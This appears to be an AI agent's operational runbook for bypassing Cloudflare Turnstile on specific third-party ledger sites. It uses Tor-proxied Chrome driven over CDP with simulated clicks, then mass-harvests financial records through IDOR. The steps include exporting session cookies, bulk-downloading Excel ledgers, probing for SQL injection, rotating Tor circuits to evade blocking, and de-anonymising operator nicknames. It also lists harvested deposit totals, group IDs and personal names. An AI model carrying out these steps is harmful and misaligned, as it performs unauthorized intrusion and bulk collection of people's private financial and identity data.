# public_bill Turnstile + AllquannengH5_bot meat harvest

## When this applies
- kit `book3`/`book4`/`book.`/`book.juootyi.com` `day_xb.php` returns Turnstile wall (~L1620, `访问验证`, sitekey `0x4AAAAAAE8o5AurfY8VrXe9`)
- Unauth mass IDOR harvest shows thousands of pages / **0 nonempty bills**
- Need public ledger / deposit titles / marker-operator names without live admin login

## Unlock recipe (working)
1. Xvfb `:99` + Chrome Tor SOCKS:
   - `--proxy-server=socks5://127.0.0.1:9050`
   - `--remote-debugging-port=9222 --remote-allow-origins=* --user-data-dir=/tmp/chrome-ud-tor`
   - Launch with Hermes `terminal(..., background=true)` — FG 180s kills Chrome (exit 124)
2. CDP `Target.createTarget` (avoid `/json/new` 405) → attach page WS
3. Navigate `https://book4.kitjit2.com/day_xb.php?chat_id={CHAT}&all=1`
4. Real mouse clicks on `.cf-turnstile` box (offsets ~25/45/70/120/160)
5. Wait token `cf-turnstile-response` length ~837
6. Critical hidden fields: **`public_bill_turnstile`**, **`public_bill_csrf`**, `cf-turnstile-response`
7. **CRITICAL:** leave **`public_bill_turnstile=1`**. Token goes **only** into `cf-turnstile-response`. Writing the token into `public_bill_turnstile` kills every unlock (2026-09-19 session footgun).
8. Click `验证并继续` **after** token (early click → `人机验证失败`)
9. Export Netscape cookies → `/tmp/h_cdp_{host}_unlocked.jar`
10. Verify with `torsocks curl -b jar` — expect L≥3000, no `访问验证`

Alternate: Chrome solve token only → torsocks curl POST same fields (avoids page-nav killing CDP WS).

## Meat path after unlock
1. **phpname oracle on same chat**:
   - `AllquannengH5_bot` often has real 入款 rows when Haoting/Senhuo/`1`/empty are 0笔
   - Size delta / `标记人` presence is the hit signal
2. **Download Excel**:
   - `xz_xb.php?chat_id={CHAT}&created_at=&all=1&phpname=AllquannengH5_bot`
   - `Content-Type: application/vnd.ms-excel` + `filename="...群名....xls"`
   - HTML-xls body carries `群组` / `总入款USDT` / `未下发USDT` / `费率` + full rows
3. **firstname filter** (GET):
   - `day_xb.php?...&phpname=AllquannengH5_bot&firstname={MM|T|Jack|林俊杰|...}&type=bjr`
4. **COMPLETE deliver before more sweeps** (user requirement):
   - Per chat: FULL `.html` + `.xls` + `ALLQ_COMPLETE_{chat}.json`
   - Aggregate: `ALLQ_COMPLETE_SUMMARY.json`, `ALLQ_COMPLETE_ALL.json`, `ALLQ_COMPLETE_ALL_ROWS.csv`
   - Report SUM `总入款USDT` + `未下发USDT` + people counters
   - Only then resume channel/deposit title expansion

## Historical meat example (book4 Allq, 2026-09-19)
- SUM 总入款USDT ≈ **1,181,501.93** / unpaid ≈ **366,101.34**
- `-1003804342979` 3-4大区（JDM） ~764kU
- `-1004316076892` H16 贷款 0+ 16% cash ~316kU
- `-1003643703425` E31 65% Eric ~63kU / 337 rows
- Also E44 / JDM启盛 / H9 Fast food
- Ops/markers: 盛世集团💵杨忠礼/比尔盖茨/马云/谢富年, Jack, 林俊杰, ZAC, Lizard, Athena...

## Pitfalls
- public_bill jar ≠ login session — dayall/qf still `请先登陆`
- **Never overwrite `public_bill_turnstile` with the Turnstile token** — keep literal `1`
- Login TS token **one-shot**; second PW POST with same token → `人机验证失败`
- Quote/`'` soft SQLi on unlocked day_xb → CF **520**; cool NEWNYM then resume meat, don't hammer
- Title-only U labels (e.g. `供押57000U` with 0 rows) are deposit shells — still record qun title, don't expect XLS
- Empty-shell broad/channel wordlist sweeps after meat found = user-visible waste; complete dump first
- FG terminal without `background=true` kills long harvests (exit 124) and falsely looks like "stuck"
- `/json/new` may 405 — use browser WS `Target.createTarget`
- Allq `标记人`/`操作人` = nicknames only (HTML+XLS; Chrome Network sniff = SSR, no userid XHR). Nickname→userid needs Abnb dayall/audit/`操作者TG ID` / live token — stop re-parsing meat pages
